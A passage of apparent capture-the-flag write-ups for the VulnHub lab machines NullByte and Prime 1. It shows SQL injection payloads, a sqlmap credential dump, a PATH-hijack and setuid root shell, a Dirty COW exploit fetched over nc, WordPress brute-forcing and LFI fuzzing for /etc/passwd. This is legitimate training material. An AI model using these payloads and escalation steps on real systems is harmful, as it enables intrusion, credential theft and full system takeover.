/usr/share/wordlists/rockyou.txt -fw 19 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : POST :: URL : http://192.168.110.11/kzMb5nVYJw/index.php :: Wordlist : FUZZ: /usr/share/wordlists/rockyou.txt :: Header : Content-Type: application/x-www-form-urlencoded :: Data : key=FUZZ :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 19 ________________________________________________ elite [Status: 200, Size: 145, Words: 9, Lines: 7] Submit form w/ elite TCP/80 (HTTP) - SQLi Database Enum w/ SQLMap Check if it is susceptible to SQLi ┌──(root💀kali)-[~/vulnHub/NullByte] └─# ffuf -u http://192.168.110.11/kzMb5nVYJw/420search.php?usrtosearch=FUZZ -w /usr/share/wordlists/sqli/vulnCheck.txt -fw 3 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.11/kzMb5nVYJw/420search.php?usrtosearch=FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/sqli/vulnCheck.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 3 ________________________________________________ &quot; OR 1 = 1 -- - [Status: 200, Size: 168, Words: 33, Lines: 1] &quot; OR &quot;&quot; = &quot; [Status: 200, Size: 168, Words: 33, Lines: 1] &quot; [Status: 200, Size: 168, Words: 33, Lines: 1] # [Status: 200, Size: 224, Words: 33, Lines: 2] :: Progress: [42/42] :: Job [1/1] :: 54 req/sec :: Duration: [0:00:03] :: Errors: 3 :: Enumerate the database w/ SQLMAP Enumerate database ┌──(root💀kali)-[~/vulnHub/NullByte/192.168.110.11/exploit] └─# sqlmap -r sqli.txt -p usrtosearch --dbs --output-dir=$(pwd)/sqlmap Parameter: usrtosearch (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment) Payload: usrtosearch=&quot; AND 5195=5195# Type: error-based Title: MySQL &amp;gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED) Payload: usrtosearch=&quot; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176786a71,(SELECT (ELT(4502=4502,1))),0x7178767671,0x78))s), 8446744073709551610, 8446744073709551610)))-- RmAL Type: time-based blind Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: usrtosearch=&quot; AND (SELECT 9975 FROM (SELECT(SLEEP(5)))HjUW)-- Hkvj Type: UNION query Title: MySQL UNION query (NULL) - 3 columns Payload: usrtosearch=&quot; UNION ALL SELECT CONCAT(0x7176786a71,0x6558556579436b4c6b736a645474705970505259756c734c58416f6261784e69665458716864597a,0x7178767671),NULL,NULL# available databases [5]: [*] information_schema [*] mysql [*] performance_schema [*] phpmyadmin [*] seth Enumerate tables seth database ┌──(root💀kali)-[~/vulnHub/NullByte/192.168.110.11/exploit] └─# sqlmap -r sqli.txt -p usrtosearch -D seth --tables --output-dir=$(pwd)/sqlmap Parameter: usrtosearch (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment) Payload: usrtosearch=&quot; AND 5195=5195# Type: error-based Title: MySQL &amp;gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED) Payload: usrtosearch=&quot; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176786a71,(SELECT (ELT(4502=4502,1))),0x7178767671,0x78))s), 8446744073709551610, 8446744073709551610)))-- RmAL Type: time-based blind Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: usrtosearch=&quot; AND (SELECT 9975 FROM (SELECT(SLEEP(5)))HjUW)-- Hkvj Type: UNION query Title: MySQL UNION query (NULL) - 3 columns Payload: usrtosearch=&quot; UNION ALL SELECT CONCAT(0x7176786a71,0x6558556579436b4c6b736a645474705970505259756c734c58416f6261784e69665458716864597a,0x7178767671),NULL,NULL# Database: seth [1 table] +-------+ | users | +-------+ Dump users table ┌──(root💀kali)-[~/vulnHub/NullByte/192.168.110.11/exploit] └─# sqlmap -r sqli.txt -p usrtosearch -D seth -T users --dump --output-dir=$(pwd)/sqlmap Parameter: usrtosearch (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment) Payload: usrtosearch=&quot; AND 5195=5195# Type: error-based Title: MySQL &amp;gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED) Payload: usrtosearch=&quot; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176786a71,(SELECT (ELT(4502=4502,1))),0x7178767671,0x78))s), 8446744073709551610, 8446744073709551610)))-- RmAL Type: time-based blind Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: usrtosearch=&quot; AND (SELECT 9975 FROM (SELECT(SLEEP(5)))HjUW)-- Hkvj Type: UNION query Title: MySQL UNION query (NULL) - 3 columns Payload: usrtosearch=&quot; UNION ALL SELECT CONCAT(0x7176786a71,0x6558556579436b4c6b736a645474705970505259756c734c58416f6261784e69665458716864597a,0x7178767671),NULL,NULL# Database: seth Table: users [2 entries] +----+---------------------------------------------+--------+------------+ | id | pass | user | position | +----+---------------------------------------------+--------+------------+ | 1 | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | &amp;lt;blank&amp;gt; | | 2 | --not allowed-- | isis | employee | +----+---------------------------------------------+--------+------------+ Pass is base64 encoded &amp;amp; hashed w/ md5 ramses:omega TCP/80 (HTTP) - SQLi Database Enum Manual Check if it is susceptible to SQLi Determine SQL query code Hypothesis SELECT id, name, position FROM users WHERE name LIKE &quot;%&amp;lt;input_field&amp;gt;%&quot; # Instead of &#39;, &quot; is used, thus &quot; allows us to close the previous query and start another one (UNION SELECT) Determine the number of columns &amp;amp; reflected columns in this table Plain Text: &quot;UNION SELECT 1,2,3-- - URL Encoded: &quot;UNION+SELECT+1,2,3--+- # Usually either # or -- - would work, but for this, only -- - worked Determine databases Plain Text: &quot;UNION SELECT group_concat(SCHEMA_NAME),2,3 FROM information_schema.schemata-- - URL Encoded: &quot;UNION+SELECT+group_concat(SCHEMA_NAME),2,3+FROM+information_schema.schemata--+- available databases [5]: [*] information_schema [*] mysql [*] performance_schema [*] phpmyadmin [*] seth Determine tables in seth database Plain Text: &quot;UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables WHERE table_schema=&#39;seth&#39;-- - URL Encoded: &quot;UNION+SELECT+group_concat(table_name),2,3+FROM+information_schema.tables+WHERE+table_schema=&#39;seth&#39;--+- Database: seth [1 Table] users Determine columns in users table from seth database Plain Text: &quot;UNION SELECT group_concat(column_name),2,3 FROM information_schema.columns WHERE table_name=&#39;users&#39;-- - URL Encoded: &quot;UNION+SELECT+group_concat(column_name),2,3+FROM+information_schema.columns+WHERE+table_name=&#39;users&#39;--+- Database: seth Table: users [3 Columns] id user pass position Determine value of columns in users table from seth database Plain Text &quot;UNION SELECT group_concat(user,&#39;:&#39;,pass),2,3 FROM seth.users -- - URL Encoded: &quot;UNION+SELECT+group_concat(user,&#39;:&#39;,pass),2,3+FROM+seth.users+--+- Database: seth Table: users [Columns: user:pass] ramses:YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE isis:--not allowed-- TCP/777 (SSH) SSH w/ ramses:omega Privilege EscalationRoot - Via SUID Binary (Path Hijacking) Enumerate SUID Binaries ramses@NullByte:~$ find / -perm -4000 2&amp;gt;/dev/null /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/eject/dmcrypt-get-device /usr/lib/pt_chown /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/bin/procmail /usr/bin/at /usr/bin/chfn /usr/bin/newgrp /usr/bin/chsh /usr/bin/gpasswd /usr/bin/pkexec /usr/bin/passwd /usr/bin/sudo /usr/sbin/exim4 /var/www/backup/procwatch &amp;lt;- Suspicious Execute /var/www/backup/procwatch, to see what it does ramses@NullByte:~$ /var/www/backup/procwatch PID TTY TIME CMD 3311 pts/0 00:00:00 procwatch 3312 pts/0 00:00:00 sh 3313 pts/0 00:00:00 ps ramses@NullByte:~$ Based on this, i think ps is being executed View contents of /var/www/backup/procwatch ramses@NullByte:~$ strings /var/www/backup/procwatch | grep ps Strings did not reveal, ps being called Assumes it calls ps w/o specifying its full path Exploit via Path Hijacking Prepend /tmp to ramses Path environment variable ramses@NullByte:~$ export PATH=/tmp:$PATH ramses@NullByte:~$ echo $PATH /tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games ramses@NullByte:~$ Create binary to spawn root shell ramses@NullByte:~$ echo &quot;cp /bin/bash /tmp/rootbash &amp;amp;&amp;amp; chmod u+s /tmp/rootbash&quot; &amp;gt; /tmp/ps; chmod 4777 /tmp/ps; ramses@NullByte:~$ ls -l /tmp total 8 -rwsrwxrwx 1 ramses ramses 54 Feb 4 05:49 ps drwx------ 3 root root 4096 Feb 4 02:11 systemd-private-dc0b6a1de996417bb76e2cd0ae273e30-cups.service-2HAlbf ramses@NullByte:~$ Check if ps from /tmp directory is called first, before /bin/ps ramses@NullByte:~$ which ps /tmp/ps ramses@NullByte:~$ Execute procwatch to create root shell ramses@NullByte:~$ /var/www/backup/procwatch ramses@NullByte:~$ ls -l /tmp total 1088 -rwsrwxrwx 1 ramses ramses 54 Feb 4 05:49 ps -rwsr-xr-x 1 root ramses 1105840 Feb 4 05:50 rootbash drwx------ 3 root root 4096 Feb 4 02:11 systemd-private-dc0b6a1de996417bb76e2cd0ae273e30-cups.service-2HAlbf ramses@NullByte:~$ Obtain root shell ramses@NullByte:~$ /tmp/rootbash -p rootbash-4.3# id;whoami uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses) root rootbash-4.3# Root Flag rootbash-4.3# cat proof.txt adf11c7a9e6523e630aaf3b9b7acb51d It seems that you have pwned the box, congrats. Now you done that I wanna talk with you. Write a walk &amp;amp; mail at xly0n@sigaint.org attach the walk and proof.txt If sigaint.org is down you may mail at nbsly0n@gmail.com USE THIS PGP PUBLIC KEY -----BEGIN PGP PUBLIC KEY BLOCK----- Version: BCPG C# v1.6.1.0 mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK +z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58 kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8 TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU Gms= =PiAQ -----END PGP PUBLIC KEY BLOCK----- rootbash-4.3# Root - Via Kernel Exploit Check system information ramses@NullByte:~$ uname -a Linux NullByte 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17) i686 GNU/Linux 3.16.0-4-686 Search exploits for Linux 3.16.0-4-686 https://www.exploit-db.com/exploits/40616 https://www.exploit-db.com/exploits/40839 Exploit ramses@NullByte:/tmp$ nc 192.168.110.4 4444 &amp;gt; 40839.c ramses@NullByte:/tmp$ mv 40839.c dirty.c ramses@NullByte:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt ramses@NullByte:/tmp$ chmod +x dirty; ./dirty " }, { "title": "Vulnhub - Prime 1", "url": "/posts/Prime-1/", "categories": "Vulnhub, Linux", "tags": "exploit/file-inclusion/lfi, tcp/80-http/cms/wordpress, linux-priv-esc/sudo/unknown-exec, linux-priv-esc/linux-creds-found, cryptography, linux-priv-esc/kernel-exploit", "date": "2022-01-29 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Sat Jan 22 00:11:42 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Prime1/192.168.1.103/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Prime1/192.168.1.103/scans/xml/_full_tcp_nmap.xml 192.168.1.103adjust_timeouts2: packet supposedly had rtt of -527248 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -527248 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -353662 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -353662 microseconds. Ignoring time.Nmap scan report for 192.168.1.103Host is up, received arp-response (0.00071s latency).Scanned at 2022-01-22 00:11:42 +08 for 11sNot shown: 65533 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcSVb7n0rTb58TfCcHJgtutnZzqf0hl48jPxI+VHOyhiQIihkQVkshhc8LdnSUg2BRGZL+RFfNLan9Q6FY0D7T/7PMlggPtSLU80er3JJO+XMfO3NURgMtVtKS0m+nRbL9C/pKSgBewxIcPk7Y45aXjAo7tsSoJ3DZUDcaitfFbAlr+108VBSx/arOXbYtusI1E2OCj1v/VKgVA9N/FL/OHuloOZPs/hY0MoamQKy+XYNdyCtrvSeRmItf09YXhFJwfY9Tr/nk077J7cz3r3INP+AFrpKVjdUAtxNpb+zAJLMJY8WF7oRZ1B8Sdljsslkh8PPK8e6Z4/rlCaJYW0OX| 256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiCXK7fYpBhJbT1KsyJkcpdXc1+zrB9rHVxBPtvA9hwTF4R4dZCZI9IpMFrperU0wqI/8uGYF9mW8l3aOAhJqc=| 256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKMh3392Cf8RmKX5UyT6C1yLIVbncwwUg1i2P7/ucKk80/tcp open http syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))|_http-title: HacknPentest| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.18 (Ubuntu)MAC Address: 00:0C:29:19:F4:FB (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=1/22%OT=22%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=000C29%TM=61EOS:ADB49%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=107%TI=Z%CI=RD%II=I%TS=OS:8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5OS:B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=712OS:0)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%AOS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0OS:%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)UOS:1(R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 21.265 days (since Fri Dec 31 17:50:48 2021)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=259 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.71 ms 192.168.1.103Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Jan 22 00:11:53 2022 -- 1 IP address (1 host up) scanned in 11.90 secondsTCP/80 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/Prime1]└─# ffuf -u http://192.168.1.103/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &quot;.html,.php,.txt&quot; -fw 20 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.1.103/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .php .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 20________________________________________________ [Status: 200, Size: 136, Words: 8, Lines: 8]dev [Status: 200, Size: 131, Words: 24, Lines: 8]image.php [Status: 200, Size: 147, Words: 8, Lines: 7]index.php [Status: 200, Size: 136, Words: 8, Lines: 8]secret.txt [Status: 200, Size: 412, Words: 66, Lines: 16]:: Progress: [18460/18460] :: Job [1/1] :: 414 req/sec :: Duration: [0:00:04] :: Errors: 0 :: image.php index.php /wordpress /dev /secret.txtInitial FootholdTCP/80 (HTTP) /secret.txt &amp;amp; /dev I think we have to FUZZ the parameter of pages w/ .php extension Before that, enumerate wordpress. Proceed to /wordpress, webserver is running Wordpress CMS Enumerate wp users ┌──(root💀kali)-[~/vulnHub/Prime1] └─# wpscan --no-update --disable-tls-checks --url http://$ip/wordpress -e u -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/Prime1/192.168.1.103/scans/tcp80/tcp_80_http_wpscan_user_enum.txt&quot; [+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18). | Found By: Rss Generator (Passive Detection) | - http://192.168.1.103/wordpress/?feed=rss2, &amp;lt;generator&amp;gt;https://wordpress.org/?v=5.2.2&amp;lt;/generator&amp;gt; | - http://192.168.1.103/wordpress/?feed=comments-rss2, &amp;lt;generator&amp;gt;https://wordpress.org/?v=5.2.2&amp;lt;/generator&amp;gt; [i] User(s) Identified: [+] victor | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) Bruteforce wpscan --no-update --disable-tls-checks --wp-content-dir wp-admin --url http://$ip/wordpress --usernames victor --passwords /usr/share/wordlists/rockyou.txt -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/Prime1/192.168.1.103/scans/tcp80/tcp_80_http_wpscan_bruteforce.txt&quot; Failed Enumerate wp plugins ┌──(root💀kali)-[~/vulnHub/Prime1] └─# wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url http://$ip/wordpress -e ap -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/Prime1/192.168.1.103/scans/tcp80/tcp_80_http_wpscan_plugin_enum.txt&quot; [i] Plugin(s) Identified: [+] akismet | Location: http://192.168.1.103/wordpress/wp-content/plugins/akismet/ | Last Updated: 2021-10-01T18:28:00.000Z | Readme: http://192.168.1.103/wordpress/wp-content/plugins/akismet/readme.txt | [!] The version is out of date, the latest version is 4.2.1 | | Found By: Known Locations (Aggressive Detection) | - http://192.168.1.103/wordpress/wp-content/plugins/akismet/, status: 200 | | Version: 4.1.2 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://192.168.1.103/wordpress/wp-content/plugins/akismet/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://192.168.1.103/wordpress/wp-content/plugins/akismet/readme.txt Back to /secret.txt We are supposed to enumerate the parameters of pages w/ .php extension Pages w/ .php index.php image.php Enumerate /index.php?&amp;lt;Enumerate&amp;gt; ┌──(root💀kali)-[~/vulnHub/Prime1] └─# ffuf -u http://192.168.1.103/index.php?FUZZ -w /usr/share/wordlists/dirb/common.txt -e &quot;.html,.php,.txt&quot; --recursion -of ffuf-recursion-directory-list-2.3-medium.txt -fw 8 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.1.103/index.php?FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .php .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 8 ________________________________________________ file [Status: 200, Size: 206, Words: 15, Lines: 8] :: Progress: [18460/18460] :: Job [1/1] :: 3979 req/sec :: Duration: [0:00:05] :: Errors: 0 :: It says digging wrong file, tried to enumerate image.php still did not find anything Enumerate second parameter /index.php?file=&amp;lt;Enumerate&amp;gt; ┌──(root💀kali)-[~/vulnHub/Prime1] └─# ffuf -u http://192.168.1.103/index.php?file=FUZZ -w /usr/share/wordlists/dirb/common.txt -e &quot;.html,.php,.txt&quot; --recursion -of ffuf-recursion-directory-list-2.3-medium.txt -fw 8,15 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.1.103/index.php?file=FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .php .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 8,15 ________________________________________________ location.txt [Status: 200, Size: 334, Words: 37, Lines: 9] :: Progress: [18460/18460] :: Job [1/1] :: 4433 req/sec :: Duration: [0:00:04] :: Errors: 0 :: secrettier360 Enumerate /image.php?&amp;lt;Enumerate&amp;gt; ┌──(root💀kali)-[~/vulnHub/Prime1] └─# echo &quot;secrettier360&quot; &amp;gt;&amp;gt; common.txt ┌──(root💀kali)-[~/vulnHub/Prime1] └─# ffuf -u http://192.168.1.103/image.php?FUZZ -w common.txt -fw 8 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.1.103/image.php?FUZZ :: Wordlist : FUZZ: common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 8 ________________________________________________ secrettier360 [Status: 200, Size: 197, Words: 13, Lines: 7] :: Progress: [4617/4617] :: Job [1/1] :: 13031 req/sec :: Duration: [0:00:04] :: Errors: 0 :: Enumerate /image.php?secrettier360=&amp;lt;Enumerate&amp;gt; Tried common.txt, directory-2.3-medium.txt Instead, try LFI wordlist Enumerate /image.php?secrettier360=&amp;lt;Enumerate&amp;gt; for LFI ┌──(root💀kali)-[~/vulnHub/Prime1]└─# ffuf -u http://192.168.1.103/image.php?secrettier360=FUZZ -w /usr/share/wordlists/LFI/file_inclusion_linux.txt -fw 13 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.1.103/image.php?secrettier360=FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/LFI/file_inclusion_linux.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 13________________________________________________/../../../../../../../../../../etc/passwd [Status: 200, Size: 2616, Words: 48, Lines: 50]/etc/adduser.conf [Status: 200, Size: 3225, Words: 414, Lines: 95]/etc/anacrontab [Status: 200, Size: 598, Words: 34, Lines: 20]/etc/apache2/mods-available/deflate.conf [Status: 200, Size: 719, Words: 53, Lines: 21]/etc/apache2/apache2.conf [Status: 200, Size: 7312, Words: 942, Lines: 228]/etc/apache2/mods-available/setenvif.conf [Status: 200, Size: 1477, Words: 125, Lines: 39]/etc/apache2/mods-enabled/deflate.conf [Status: 200, Size: 719, Words: 53, Lines: 21]/etc/apache2/mods-available/autoindex.conf [Status: 200, Size: 3571, Words: 325, Lines: 103]/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 1040, Words: 127, Lines: 31]/etc/apache2/envvars [Status: 200, Size: 1979, Words: 202, Lines: 54]/etc/apache2/mods-available/mime.conf [Status: 200, Size: 7836, Words: 954, Lines: 256]/etc/apache2/mods-available/ssl.conf [Status: 200, Size: 3307, Words: 443, Lines: 92]/etc/apache2/mods-enabled/mime.conf [Status: 200, Size: 7836, Words: 954, Lines: 256]/etc/apache2/mods-enabled/dir.conf [Status: 200, Size: 354, Words: 27, Lines: 12]/etc/apache2/mods-available/proxy.conf [Status: 200, Size: 1019, Words: 136, Lines: 34]/etc/apache2/mods-enabled/negotiation.conf [Status: 200, Size: 921, Words: 121, Lines: 27]/etc/apache2/mods-available/dir.conf [Status: 200, Size: 354, Words: 27, Lines: 12]/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 946, Words: 94, Lines: 36]/etc/apache2/sites-enabled/000-default.conf [Status: 200, Size: 1529, Words: 184, Lines: 38]/etc/avahi/avahi-daemon.conf [Status: 200, Size: 1944, Words: 142, Lines: 75]/etc/bluetooth/network.conf [Status: 200, Size: 317, Words: 23, Lines: 13]/etc/bluetooth/input.conf [Status: 200, Size: 594, Words: 65, Lines: 20]/etc/bluetooth/main.conf [Status: 200, Size: 4071, Words: 554, Lines: 96]/etc/apache2/ports.conf [Status: 200, Size: 517, Words: 48, Lines: 22]/etc/apt/sources.list [Status: 200, Size: 3100, Words: 308, Lines: 58]/etc/bash.bashrc [Status: 200, Size: 2385, Words: 387, Lines: 